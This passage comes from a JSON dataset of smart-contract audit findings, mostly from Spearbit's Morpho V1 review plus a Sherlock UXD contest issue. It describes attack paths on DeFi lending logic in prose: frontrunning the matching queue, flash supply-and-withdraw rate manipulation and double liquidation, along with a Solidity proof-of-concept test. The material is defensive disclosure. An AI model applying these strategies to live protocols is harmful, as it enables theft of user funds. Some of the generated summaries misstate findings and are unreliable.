      "content": "## Severity: Medium Risk\n\n## Context\n`aave-v2/ExitPositionsManager.sol#L277`\n\n## Description\nMorpho implements liquidations by repaying the borrowed asset and then withdrawing the collateral asset from the underlying protocol (Aave / Compound). If there is no liquidity in the collateral asset pool, the liquidation will fail. Morpho could incur bad debt as they cannot liquidate the user. \n\nThe liquidation mechanisms of Aave and Compound work differently: they allow the liquidator to seize the `debtorsTokens/cTokens`, which can later be withdrawn for the underlying token once there is enough liquidity in the pool. \n\nTechnically, an attacker could even force no liquidity on the pool by frontrunning liquidations by borrowing the entire pool amount, preventing them from being liquidated on Morpho. However, this would require significant capital as collateral in most cases.\n\n## Recommendation\nThink about adding a similar feature where liquidators can seize `aTokens/cTokens` instead of withdrawing underlying tokens from the pool. The `aTokens/cTokens` of all pool users are already in the Morpho contract and thus in Morpho's control. Note that this would only work with onPool balances but not with inP2P balances, as these don't mint `aTokens/cTokens`.\n\n## Morpho\nAs it requires large changes in the liquidation process, we decided not to implement this recommendation on the current codebase.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a medium risk issue with the ExitPositionsManager.sol in aave-v2. The issue is that if there is no liquidity in the collateral asset pool, the liquidation will fail and Morpho could incur bad debt as they cannot liquidate the user. The liquidation mechanisms of Aave and Compound allow the liquidator to seize the debtorsTokens/cTokens, but this would require significant capital as collateral in most cases.\n\nThe recommendation is to add a feature where liquidators can seize aTokens/cTokens instead of withdrawing underlying tokens from the pool. This would only work with onPool balances but not with inP2P balances as these don't mint aTokens/cTokens. Morpho decided not to implement this recommendation on the current codebase, and this was acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Liquidation",
        "DOS"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6908",
      "title": "ERC20 with transfer's fee are not handled by *PositionManager",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- PositionsManager.sol\n- EntryPositionsManager.sol\n- ExitPositionsManager.sol\n\n## Description\nSome ERC20 tokens could have fees attached to the transfer event, while others could enable them in the future (see USDT, USDC). The current implementation of both PositionManager (for Aave and Compound) is not taking into consideration these types of ERC20 tokens. While Aave seems not to take into consideration this behavior (see LendingPool.sol), Compound, on the other hand, is explicitly handling it inside the `doTransferIn` function. \n\nMorpho is taking for granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality, the contract will receive less. In `InsupplyLogic`, for example, Morpho will account for the user's p2p/pool balance for the full amount but will repay/supply to the pool less than the amount accounted for.\n\n## Recommendation\nConsider updating the `PositionManager` logic to track the real amount of token that has been sent by the user after the transfer (difference in before and after balance), but also the amount of tokens that have been supplied/borrowed/withdrawn/... given that Morpho itself is doing a second transfer/transferFrom to/from the Aave/Compound protocol.\n\n## Morpho\nWe updated the asset listing checklist. However, given the small likelihood for USDC and USDT to turn on fees, we decided not to implement the recommendations.\n\n## Spearbit\nVerified the checklist, and acknowledged that the recommendations will not be implemented.",
      "summary": "\nThis bug report is about the current implementation of PositionsManager.sol, EntryPositionsManager.sol, and ExitPositionsManager.sol not taking into consideration ERC20 tokens that could have fees attached to their transfer events. Morpho is taking for granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality the contract will receive less. The recommendation is to update the PositionManager logic to track the real amount of token that has been sent by the user after the transfer. However, given the small likelihood for USDC and USDT to turn on fees, Morpho has decided not to implement the recommendations. The checklist has been updated and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6907",
      "title": "Users can continue to borrow from a deprecated market",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n**Severity:** Medium Risk  \n**Context:** \n- aave-v2/MorphoGovernance.sol#L395 \n- compound/MorphoGovernance.sol#L372  \n\n**Description:**  \nWhen a market is being marked as deprecated, there is no verification that the borrow for that market has already been disabled. This means a user could borrow from this market and immediately be eligible to be liquidated.\n\n**Recommendation:**  \nA couple of options:\n- Add a require or modifier to ensure borrow has been disabled, and revert if not.\n- Disable borrow as part of deprecating the market.\n\n**Morpho:**  \nFixed in PR 1551.\n\n**Spearbit:**  \nVerified. After the PR change, to be able to deprecate a market, Morpho must pause the borrowing state; otherwise, the transaction will revert. When both the borrow state is paused and the market is deprecated, if Morpho wants to \"reset\" those values (borrow not paused, and the market is not deprecated), Morpho must \"un-deprecate\" it and only then \"un-pause\" it.\n\n**Note:**  \nMorpho should check that all the markets created are both not deprecated and not borrow-paused before deploying the PR to be sure to not enter a case where the new checks would not work or would prevent resetting the flags because the system is in an inconsistent state.",
      "summary": "\nThis bug report is about the MorphoGovernance.sol contract. When a market is marked as deprecated, there is no verification that the borrow for that market has been disabled. This means a user could borrow from this market and be eligible to be liquidated. To fix this, two options were proposed - add a require or modifier to ensure borrow has been disabled, or disable borrow as part of deprecating the market. The latter was implemented in PR 1551 and verified. Morpho should check that all markets created are both not deprecated and not borrow-paused before deploying the PR to prevent entering a system state where the new checks would not work or would prevent resetting the flags.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6906",
      "title": "Differences between Morpho and Compound borrow validation logic",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`compound/PositionsManager.sol#L336-L344`\n\n## Description\nThe Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. \n\nBy reviewing both logic, we have noticed that there are some differences between them:\n\n- **Borrow Caps**: \n  - Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current `borrowCaps[cToken]` threshold. \n  - Morpho does not check this threshold and could allow users to borrow on the P2P side (avoiding the revert because it would not trigger the underlying compound borrow action). Morpho should anyway monitor the borrowCaps of the market because it could make `increaseP2PDeltasLogic` and `_unsafeWithdrawLogic` reverts.\n\n- **Deprecated Markets**: \n  - Both Morpho and Compound do not check if a market is in \"deprecated\" state. This means that as soon as a user borrows some tokens, he/she can be instantly liquidated by another user.\n    - If the flag is true on Compound, the Morpho User can be liquidated directly on Compound.\n    - If the flag is true on Morpho, the borrower can be liquidated on Morpho.\n\n- **Borrow Guardian Paused**: \n  - Morpho does not check if `borrowGuardianPaused[cToken]` on Compound; a user could be able to borrow in P2P while the cToken market has borrow paused.\n\nMore information about detailed information can be found in the discussion topic **\"Differences in actions checks between Morpho and Compound.\"**\n\n## Recommendation\nConsider implementing the missing logic/sanity checks or documenting why those checks should not be added to Morpho's implementation.\n\n## Morpho\nHere are the motivations behind not implementing the flags:\n\n1. No amount of checks will be sufficient, and the Morpho Operator should be proactive about pausing before the underlying pool does.\n2. Hardcoding can actually reduce flexibility in Morpho's pausing discretion since one action on Morpho can actually constitute multiple types of interactions with the pool.\n3. Some checks are gas intensive as information from the pool needs to be fetched.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the differences between the logic of Morpho and the underlying protocol, Compound. The report states that Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current borrowCaps[cToken] threshold, while Morpho does not check this threshold. Additionally, both Morpho and Compound do not check if a market is in \"deprecated\" state, and Morpho does not check if borrowGuardianPaused[cToken] on Compound. The report recommends that Morpho should consider implementing the missing logic/sanity checks or document why those checks should not be added to Morphos implementation. Morpho provided reasons such as no amount of checks will be sufficient and some checks are gas intensive as information from the pool needs to be fetched. The report has been acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6905",
      "title": "Frontrunners can exploit system by not allowing head of DLL to match in P2P",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nMatchingEngine.sol\n\n## Description\nFor a given asset **x**, liquidity is supplied on the pool since there are not enough borrowers. \n\n- **suppliersOnPool head**: `0xawith` 1000 units of x  \n- Whenever there is a new transaction in the mempool to borrow 100 units of x:\n  - Frontrunner supplies 1001 units of x and is supplied on pool.\n  - `updateSuppliers` will put the frontrunner on the head (assuming very high gas is supplied).\n  - Borrower's transaction lands and is matched 100 units of x with a frontrunner in p2p.\n  - Frontrunner withdraws the remaining 901 left which was on the underlying pool.\n\n## Favorable conditions for an attack:\n- Relatively fewer gas fees & relatively high block gas limit.\n- `insertSorted` is able to traverse to head within block gas limit (i.e. length of DLL).\n\nSince this is a non-atomic sandwich, the frontrunner needs excessive capital for a block's time period.\n\n## Recommendation\nConsider mitigations for frontrunning sandwich attacks.\n\n## Morpho\nWe acknowledge this issue and we are currently searching for better matching engine mechanisms. Though, as we must prevent the protocol from DDOs attacks a classic FIFO is not possible. We'll keep the matching engine like it is as the result of the front-running attack you mentioned is similar to a whale with huge capital which would be at the head of the list.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a potential attack on the MatchingEngine.sol code. The attack involves a \"frontrunner\" supplying more units of an asset than necessary, and then withdrawing the remaining units after a transaction has been matched. This attack is possible under certain conditions, such as when there is a low gas fee and a high block gas limit.\n\nMorpho has acknowledged the issue and is looking for better matching engine mechanisms. However, they must also consider the risk of a Distributed Denial of Service (DDOS) attack and thus cannot use a classic FIFO system. As a result, they will keep the matching engine as it is, as the attack is similar to a whale with huge capital at the head of the list. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Front-Running",
        "DOS"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6904",
      "title": "P2P borrowers' rate can be reduced",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Original Context\n(This area of the code has changed significantly since the initial audit, so maintaining the link to the original code base)  \nMarketsManagerForAave.sol#L448  \n\n## Context\n- aave-v2/InterestRatesManager.sol#L182  \n- compound/InterestRatesManager.sol#L164  \n\n## Description\nUsers on the pool currently earn a much worse rate than users with P2P credit lines. There's a queue for being connected P2P. As this queue could not be fully processed in a single transaction, the protocol introduces the concept of a max iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced, leading to worse rates than before.\n\n### Example\nImagine some borrowers are matched P2P (earning a low borrow rate), and many are still on the pool and therefore in the pool queue (earning a worse borrow rate from Aave).\n\n- An attacker supplies a huge amount, creating a P2P credit line for every borrower. (They can repeat this step several times if the max iterations limit is reached.)\n- The attacker immediately withdraws the supplied amount again. The protocol now attempts to demote the borrowers and reconnect them to the pool. But the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrowing rate) that are still wrongly recorded to be in a P2P position for some borrowers. This increase in borrowing rate is socialized equally among all P2P borrowers (reflected in an updated `p2pBorrowRate` as the `shareOfDelta` increased).\n- The initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it's close to the on-pool rate.\n- If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn a better P2P rate than the on-pool rate they earned before.\n\n## Recommendation\nConsider mitigations for single-transaction flash supply & withdraw attacks.\n\n## Morpho\nWe acknowledge the risk and won't be fixing this issue, as we might want to refactor the entire queue system at some point.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report concerns a vulnerability in MarketsManagerForAave.sol#L448, aave-v2/InterestRatesManager.sol#L182 and compound/InterestRatesManager.sol#L164. It states that users who are part of a pool queue can earn a worse rate than users with P2P credit lines. An attacker can exploit this vulnerability by supplying a huge amount, creating a P2P credit line for every borrower and then immediately withdrawing the supplied amount again. This will lead to a worse rate for existing P2P users. The recommendation is to consider mitigations for single-transaction flash supply & withdraw attacks. Morpho acknowledges the risk but won't be fixing this issue, as they might want to refactor the entire queue system at some point. Spearbit has acknowledged this report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6903",
      "title": "User withdrawals can fail if Morpho position is close to liquidation",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nExitPositionsManager.sol#L468\n\n## Description\nWhen trying to withdraw funds from Morpho as a P2P supplier, the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If the Morpho position on Aave's debt/collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail, and the position can also not be liquidated. The withdrawals could fail.\n\n## Recommendation\nThis seems hard to solve in the current system as it relies on the \"hard withdraws\" to always ensure enough liquidity for P2P suppliers. Consider ways to mitigate the impact of this problem. \n\n## Morpho\nSince Morpho will first launch on Compound (where there is only Collateral Factor), we will not focus now on this particular issue.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report describes a problem with the ExitPositionsManager.sol code. When a P2P supplier attempts to withdraw funds from Morpho, the last step of the withdrawal algorithm tries to borrow an amount from the pool. If the Morpho position on Aave's debt/collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail and the position can also not be liquidated, so the withdrawal could fail.\n\nThe recommendation is to consider ways to mitigate the impact of this problem. Morpho will first launch on Compound, where there is only Collateral Factor, so they will not focus now on this particular issue. Spearbit has acknowledged the bug report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "DOS",
        "Business Logic"
      ],
      "finders": [
        "Christoph Michel",
        "Emanuele Ricci",
        "hack3r-0m",
        "Jay Jonah"
      ]
    },
    {
      "id": "6902",
      "title": "setIsPausedForAllMarkets bypass the check done in setIsBorrowPaused and allow resuming borrow on a deprecated market",
      "impact": "MEDIUM",
      "content": "## Medium Risk Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- `aave-v2/MorphoGovernance.sol#L470`\n- `compound/MorphoGovernance.sol#L470`\n\n## Description\nThe `MorphoGovernance` contract allows Morpho to set the `isBorrowPaused` to `false` only if the market is not deprecated.\n\n```solidity\nfunction setIsBorrowPaused(address _poolToken, bool _isPaused) external onlyOwner isMarketCreated(_poolToken) {\n    if (!_isPaused && marketPauseStatus[_poolToken].isDeprecated) revert MarketIsDeprecated();\n    marketPauseStatus[_poolToken].isBorrowPaused = _isPaused;\n    emit IsBorrowPausedSet(_poolToken, _isPaused);\n}\n```\n\nThis check is not enforced by the `_setPauseStatus` function, which is called by `setIsPausedForAllMarkets`, allowing Morpho to resume borrowing for deprecated markets.\n\n## Test to Reproduce the Issue\n```solidity\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity ^0.8.0;\n\nimport \"./setup/TestSetup.sol\";\n\ncontract TestSpearbit is TestSetup {\n    using WadRayMath for uint256;\n\n    function testBorrowPauseCheckSkipped() public {\n        // Deprecate a market\n        morpho.setIsBorrowPaused(aDai, true);\n        morpho.setIsDeprecated(aDai, true);\n        checkPauseEquality(aDai, true, true);\n        \n        // you cannot resume borrowing if the market is deprecated\n        hevm.expectRevert(abi.encodeWithSignature(\"MarketIsDeprecated()\"));\n        morpho.setIsBorrowPaused(aDai, false);\n        checkPauseEquality(aDai, true, true);\n        \n        // but this check is skipped if I call directly `setIsPausedForAllMarkets `\n        morpho.setIsPausedForAllMarkets(false);\n        \n        // this should revert because you cannot resume borrowing for a deprecated market\n        checkPauseEquality(aDai, false, true);\n    }\n\n    function checkPauseEquality(\n        address aToken,\n        bool shouldBePaused,\n        bool shouldBeDeprecated\n    ) public {\n        (\n            bool isSupplyPaused,\n            bool isBorrowPaused,\n            bool isWithdrawPaused,\n            bool isRepayPaused,\n            bool isLiquidateCollateralPaused,\n            bool isLiquidateBorrowPaused,\n            bool isDeprecated\n        ) = morpho.marketPauseStatus(aToken);\n        \n        assertEq(isBorrowPaused, shouldBePaused);\n        assertEq(isDeprecated, shouldBeDeprecated);\n    }\n}\n```\n\n## Recommendation\nOne possible solution is to follow the same approach implemented in the Aave V3 codebase. The update of the `isBorrowPaused` must only occur if the market is not deprecated.\n\n## Morpho\nThis issue has been fixed in PR 1642.\n\n## Spearbit\nVerified.",
      "summary": "\nThe bug report is about a vulnerability in the MorphoGovernance contract that allows Morpho to set the isBorrowPaused to false even if the market is deprecated. This is because the check is not enforced by the _setPauseStatus function, which is called by setIsPausedForAllMarkets. To reproduce the issue, a test was created using the TestSetup contract. The recommendation for a fix was to follow the same approach implemented in the aave-v3 codebase, which only updates the isBorrowPaused if the market is not deprecated. Morpho fixed the issue in PR 1642 and Spearbit verified it.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6901",
      "title": "A market could be deprecated but still prevent liquidators to liquidate borrowers if isLiquidateBorrowPaused istrue",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context \n- aave-v2/MorphoGovernance.sol#L358-L366 \n- compound/MorphoGovernance.sol#L368-L376 \n\n## Description \nCurrently, when a market must be deprecated, Morpho checks that borrowing has been paused before applying the new value for the flag.\n\n```solidity\nfunction setIsDeprecated(address _poolToken, bool _isDeprecated)\nexternal\nonlyOwner\nisMarketCreated(_poolToken)\n{\n    if (!marketPauseStatus[_poolToken].isBorrowPaused) revert BorrowNotPaused();\n    marketPauseStatus[_poolToken].isDeprecated = _isDeprecated;\n    emit IsDeprecatedSet(_poolToken, _isDeprecated);\n}\n```\n\nThe same check should be done in `isLiquidateBorrowPaused`, allowing the deprecation of a market only if `isLiquidateBorrowPaused == false`, otherwise liquidators would not be able to liquidate borrowers on a deprecated market.\n\n## Recommendation \nPrevent the deprecation of a market if the `isLiquidateBorrowPaused` flag is set to true. Consider also checking the `isDeprecated` flag in the `setIsLiquidateBorrowPaused` to prevent pausing the liquidation if the market is deprecated. If Morpho implements the specific behavior, it should also be aware of the issue described in \"setIsPausedForAllMarkets\" bypassing the check done in `setIsBorrowPaused` and allowing resuming borrow on a deprecated market.\n\n## Morpho \nWe acknowledge this issue. The reason behind this is the following: given what @MathisGD said, if we want to be consistent, we should prevent pausing the liquidation borrow on a deprecated asset. However, there might be an issue (we don't know) with the liquidation borrow, and the operator would not be able to pause it. For this reason, we prefer to leave things as it is.\n\n## Spearbit \nAcknowledged.",
      "summary": "\nThis bug report is about the MorphoGovernance.sol code in the aave-v2 and compound projects. The code is designed to prevent the deprecation of a market unless borrowing has been paused. However, the same check should also be done for isLiquidateBorrowPaused, to ensure that liquidators cannot liquidate borrowers on a deprecated market. The recommendation is to prevent deprecation of a market if isLiquidateBorrowPaused is set to true, and also to check the isDeprecated flag in setIsLiquidateBorrowPaused to prevent pausing liquidation if the market is deprecated. Morpho acknowledges the issue and has decided to leave things as they are, as there may be an issue with the liquidation borrow that the operator is not aware of. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Pause",
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6900",
      "title": "Liquidating Morpho's Aave position leads to state desync",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n**Context:** ExitPositionsManager.sol#L239\n\n## Description\nMorpho has a single position on Aave that encompasses all of Morpho's individual user positions that are on the pool. When this Aave Morpho position is liquidated, the user position state tracked in Morpho desyncs from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. It's also possible to double-liquidate for a profit.\n\n## Example\nThere's a single borrower B1 on Morpho who is connected to the Aave pool. B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho. The ETH price crashes, and the position becomes liquidatable. A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit. This repaid debt/removed collateral is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave. The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus. The state remains desynced.\n\n## Recommendation\nLiquidating the Morpho position should not break core functionality for Morpho users.\n\n**Morpho:** We will not implement any \"direct\" fix inside the code.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is about a problem with the ExitPositionsManager.sol file, which is part of the Morpho platform. The issue is that when the single Aave position held by Morpho is liquidated, the user position state tracked in Morpho desyncs from the actual Aave position. This can lead to users not being able to withdraw their collateral or repay their debt from Morpho, and it can also allow for double-liquidation for a profit. \n\nAs an example, if a single borrower B1 supplies 1 ETH and borrows 2500 DAI, creating a position on Aave for Morpho, and then the ETH price crashes, the position becomes liquidatable. If a liquidator liquidates the position on Aave, they can repay some debt and seize some collateral for profit, but this is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI, and the same user on Morpho can be liquidated again.\n\nThe recommendation is that liquidating the Morpho position should not break core functionality for Morpho users, but Morpho has stated that they will not implement any \"direct\" fix inside the code. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6595",
      "title": "M-13: PerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow error",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/97 \n\n## Found by \nrvierdiiev\n\n## Summary\nPerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow error\n## Vulnerability Detail\nWhen user deposits using PerpDepository, then `netAssetDeposits` variable is increased with the base assets amount, provided by depositor.\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L283-L288\n```solidity\n    function _depositAsset(uint256 amount) private {\n        netAssetDeposits += amount;\n\n\n        IERC20(assetToken).approve(address(vault), amount);\n        vault.deposit(assetToken, amount);\n    }\n```\n\nAlso when user withdraws, this `netAssetDeposits` variable is decreased with base amount that user has received for redeeming his UXD tokens.\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L294-L302\n```solidity\n    function _withdrawAsset(uint256 amount, address to) private {\n        if (amount > netAssetDeposits) {\n            revert InsufficientAssetDeposits(netAssetDeposits, amount);\n        }\n        netAssetDeposits -= amount;\n\n\n        vault.withdraw(address(assetToken), amount);\n        IERC20(assetToken).transfer(to, amount);\n    }\n```\n\nThe problem here is that when user deposits X assets, then he receives Y UXD tokens. And when later he redeems his Y UXD tokens he can receive more or less than X assets. This can lead to situation when netAssetDeposits variable will be seting to negative value which will revert tx.\n\nExample.\n1.User deposits 1 WETH when it costs 1200$. As result 1200 UXD tokens were minted and netAssetDeposits was set to 1.\n2.Price of WETH has decreased and now it costs 1100.\n3.User redeem his 1200 UXD tokens and receives from perp protocol 1200/1100=1.09 WETH. But because netAssetDeposits is 1, then transaction will revert inside `_withdrawAsset` function with underflow error.\n## Impact\nUser can't redeem all his UXD tokens.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L264-L278\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L294-L302\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L240-L253\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L283-L288\n## Tool used\n\nManual Review\n\n## Recommendation\nAs you don't use this variable anywhere else, you can remove it.\nOtherwise you need to have 2 variables instead: totalDeposited and totalWithdrawn. \n\n## Discussion\n\n**WarTech9**\n\nOne fix: `netAssetDeposits` should be updated during rebalancing.\n\n**WarTech9**\n\n@acamill This _can only be partially fixed_ by updating `netAssetsDeposits` while rebalancing but that's only resolves the issue if rebalancing has occurred. It would still be possible to run into this if rebalancing has not yet occurred so its not a full fix. \nWe could use 2 variables as suggested but due to changes in asset values between mints and redeems, those would diverge and would be meaningless. \nWe already have the position size which tells us this information, thus removing this field is the better option.\n\n**IAm0x52**\n\nEscalate for 25 USDC\n\nThis should only be medium severity because it is an edge case for the following reasons:\n1) It can only occur if the average withdraw price is chronically under the average deposit price.\n2) It only affects the tail end of withdraws, requiring a majority of the depository to be withdrawn\n3) This state is not permanent because later deposits/withdraws can function in reverse (i.e. deposited at 1100 and withdraw at 1200) to cause netAssetsDeposits to go back up and free stuck assets\n\n**sherlock-admin**\n\n > Escalate for 25 USDC\n> \n> This should only be medium severity because it is an edge case for the following reasons:\n> 1) It can only occur if the average withdraw price is chronically under the average deposit price.\n> 2) It only affects the tail end of withdraws, requiring a majority of the depository to be withdrawn\n> 3) This state is not permanent because later deposits/withdraws can function in reverse (i.e. deposited at 1100 and withdraw at 1200) to cause netAssetsDeposits to go back up and free stuck assets\n\nYou've created a valid escalation for 25 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nGiven the certain specific requirements for the issue to occur, also note that there the condition can correct itself to free stuck assets.\nConsidering this issue as medium\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Given the certain specific requirements for the issue to occur, also note that there the condition can correct itself to free stuck assets.\n> Considering this issue as medium\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**hrishibhat**\n\nFix: https://github.com/UXDProtocol/uxd-evm/pull/26\n\n**IAm0x52**\n\nFixes look good. `netAssetDeposits` is now updated on rebalances",
      "summary": "\nA bug was reported on PerpDepository.netAssetDeposits variable which can prevent users from withdrawing their assets with an underflow error. This occurs when the user deposits assets at a certain price and then redeems his UXD tokens at a lower price. This can lead to a situation where the netAssetDeposits variable will become negative, causing the transaction to revert. The bug was found by rvierdiiev and was confirmed by manual review.\n\nThe issue can be fixed by either removing the variable or by using two variables, totalDeposited and totalWithdrawn, instead. It was considered a medium severity issue as it is an edge case and can be corrected itself if later deposits/withdraws occur in the opposite direction. The fix was accepted and submitted by hrishibhat and confirmed by IAm0x52. The contestants' payouts and scores were updated according to the changes made on this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/97",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "6594",
      "title": "M-12: PerpDepository has no way to withdraw profits depriving stakers of profits owed",
      "impact": "MEDIUM",
